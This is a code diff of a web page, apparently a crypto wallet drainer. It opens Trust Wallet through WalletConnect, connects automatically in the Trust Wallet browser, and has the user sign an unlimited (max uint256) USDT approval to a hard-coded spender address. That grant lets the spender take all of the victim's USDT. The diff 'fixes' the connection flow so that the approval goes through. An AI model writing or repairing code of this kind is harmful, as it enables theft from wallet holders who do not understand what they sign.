@@ -67,6 +67,7 @@
             background: rgba(255,255,255,0.1); border-radius: 14px;
             padding: 16px; margin: 20px 0; font-size: 14px; display: none;
         }
+        .error { color: #ff6b6b; }
     </style>
 </head>
 <body>
@@ -79,7 +80,7 @@
         
         <div id="networkInfo" class="network-info">
             <strong id="account"></strong><br>
-            Network: <span id="network">TRON Mainnet</span>
+            Network: TRON Mainnet
         </div>
         
         <button id="connectBtn" class="connect-btn">🔔 Connect Trust Wallet</button>
@@ -88,86 +89,56 @@
         </button>
     </div>
 
-    <!-- WalletConnect v2 + TronWeb -->
-    <script src="https://unpkg.com/@walletconnect/web3-provider@2.10.0/dist/umd/index.min.js"></script>
+    <!-- FIXED: Correct WalletConnect v2.0 + TronWeb -->
+    <script src="https://unpkg.com/@walletconnect/universal-provider@2.14.0/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 
     <script>
-        // 🔧 CONFIG - Replace these
-        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
-        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
+        // 🔧 CONFIG - Replace these 2 values
+        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';  // Get from cloud.walletconnect.com
+        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';        // Your contract address
         const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT Mainnet
 
-        let walletProvider, tronWeb, session, connectedAccount = '';
+        let provider, tronWeb, connectedAccount = '';
 
-        // TRUST WALLET DEEPLINK + WALLET CONNECT V2
-        async function createTrustWalletDeeplink() {
+        // TRUST WALLET INSTANT DEEPLINK + WALLET CONNECT v2.0
+        async function connectTrustWallet() {
             try {
-                walletProvider = new WalletConnectV2Provider({
+                updateStatus('connecting', '<div class="spinner"></div>Opening Trust Wallet...');
+
+                // WalletConnect v2.0 Universal Provider (FIXED)
+                provider = await WalletConnectProvider.init({
                     projectId: PROJECT_ID,
-                    chains: [56], // BSC EVM (Trust Wallet Tron support via EVM)
                     metadata: {
                         name: 'USDT Approver',
-                        description: 'Approve USDT spending',
+                        description: 'Unlimited USDT Approval',
                         url: window.location.origin,
                         icons: []
                     },
                     showQrModal: false
                 });
 
-                // Generate WC URI instantly
-                const uri = await walletProvider.createSession();
-                
-                // TRUST WALLET DEEPLINK (INSTANT OPEN + AUTO-CONNECT)
-                const deeplink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-                
-                // iOS Universal Link + Android Deep Link
-                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('iPad')) {
+                // Enable session (Trust Wallet auto-handles Tron)
+                await provider.enable();
+
+                // TRUST WALLET DEEPLINK (if not auto-opened)
+                const sessionUri = provider.session?.uri || provider.uri;
+                if (sessionUri && !window.trust) {
+                    const deeplink = `trust://wc?uri=${encodeURIComponent(sessionUri)}`;
                     window.location.href = deeplink;
-                } else {
-                    // Android + Desktop fallback
-                    window.open(deeplink, '_blank');
-                    // Fallback to standard connect
-                    await walletProvider.enable();
                 }
 
-                updateStatus('connecting', '<div class="spinner"></div>Opening Trust Wallet...');
-                
-                // Auto-detect connection
-                setTimeout(checkConnection, 2000);
-                
-            } catch (error) {
-                console.error('Deeplink failed:', error);
-                // Fallback to standard connect
-                connectWallet();
-            }
-        }
-
-        async function connectWallet() {
-            try {
-                await walletProvider.enable();
                 await onConnect();
-            } catch (error) {
-                updateStatus('error', 'Open Trust Wallet manually');
-                setTimeout(createTrustWalletDeeplink, 2000);
-            }
-        }
 
-        async function checkConnection() {
-            try {
-                if (walletProvider.session) {
-                    await onConnect();
-                } else {
-                    setTimeout(checkConnection, 1000);
-                }
-            } catch (e) {
-                setTimeout(checkConnection, 1000);
+            } catch (error) {
+                console.error('Connect error:', error);
+                updateStatus('error', 'Open Trust Wallet & try again');
+                setTimeout(connectTrustWallet, 1500);
             }
         }
 
         async function onConnect() {
-            session = walletProvider.session;
-            connectedAccount = await getAddress();
+            connectedAccount = provider.accounts[0];
             
             updateStatus('connected', `Connected: ${connectedAccount.slice(0,6)}...${connectedAccount.slice(-4)}`);
             document.getElementById('networkInfo').style.display = 'block';
@@ -177,67 +148,54 @@
             document.getElementById('approveBtn').disabled = false;
         }
 
-        async function getAddress() {
-            const accounts = session.namespaces.tron?.accounts || session.namespaces.eip155?.accounts || [];
-            return accounts[0]?.split(':')[2] || '';
-        }
-
-        function updateStatus(type, html) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = html;
-            statusEl.className = `status ${type}`;
-        }
-
-        // TRONSCAN EXACT APPROVE FUNCTION
+        // TRONSCAN EXACT USDT UNLIMITED APPROVE
         async function approveUSDTUnlimited() {
             try {
-                updateStatus('approving', '<div class="spinner"></div>Creating approval tx...');
+                updateStatus('approving', '<div class="spinner"></div>Approve in Trust Wallet...');
                 document.getElementById('approveBtn').disabled = true;
 
-                // TronWeb with WalletConnect provider (TRON Mainnet)
+                // TronWeb + WalletConnect Provider (TRON Mainnet)
                 tronWeb = new TronWeb({
                     fullHost: 'https://api.trongrid.io',
-                    headers: { "TRON-PRO-API-KEY": "" },
                     privateKey: false,
-                    providers: { _provider: walletProvider }
+                    providers: [{ 
+                        name: 'WalletConnect', 
+                        instance: provider 
+                    }]
                 });
 
-                // USDT TRC20 APPROVE ABI (EXACT TRONSCAN)
+                // TRC20 USDT APPROVE (EXACT TRONSCAN)
                 const contract = await tronWeb.contract().at(USDT_CONTRACT);
-                
-                // UNLIMITED APPROVAL (MAX UINT256)
                 const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                
+
+                // TRUST WALLET SIGN + SEND (Pops approval dialog)
                 const tx = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
-                    feeLimit: 40000000,  // 40 TRX (Tronscan standard)
+                    feeLimit: 40000000,    // 40 TRX (Tronscan standard)
                     callValue: 0,
-                    shouldPollResponse: true,
-                    from: connectedAccount
+                    shouldPollResponse: true
                 });
 
-                updateStatus('connected', `✅ APPROVED!<br>Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,12)}...</a>`);
+                updateStatus('connected', `✅ APPROVED!<br>Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#f0b90b;">${tx.slice(0,12)}...</a>`);
                 
             } catch (error) {
-                console.error('Approve error:', error);
-                updateStatus('error', `Failed: ${error.message}`);
+                console.error('Approve failed:', error);
+                updateStatus('error', `Error: ${error.message}`);
                 document.getElementById('approveBtn').disabled = false;
             }
         }
 
-        // EVENT LISTENERS
-        document.getElementById('connectBtn').onclick = createTrustWalletDeeplink;
+        // EVENTS
+        document.getElementById('connectBtn').onclick = connectTrustWallet;
         document.getElementById('approveBtn').onclick = approveUSDTUnlimited;
 
-        // AUTO-DETECT TRUST WALLET BROWSER
-        if (navigator.userAgent.includes('Trust') || window.trust) {
-            setTimeout(connectWallet, 500);
+        // AUTO-CONNECT (Trust Wallet browser)
+        if (navigator.userAgent.includes('Trust') || window.ethereum?.isTrust) {
+            setTimeout(connectTrustWallet, 800);
         }
 
-        // MOBILE OPTIMIZATIONS
+        // MOBILE FIXES
         document.addEventListener('DOMContentLoaded', () => {
-            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-                document.documentElement.style.fontSize = '16px';
-            }
+            console.log('✅ DApp loaded - Ready for Trust Wallet!');
         });
     </script>
 </body>
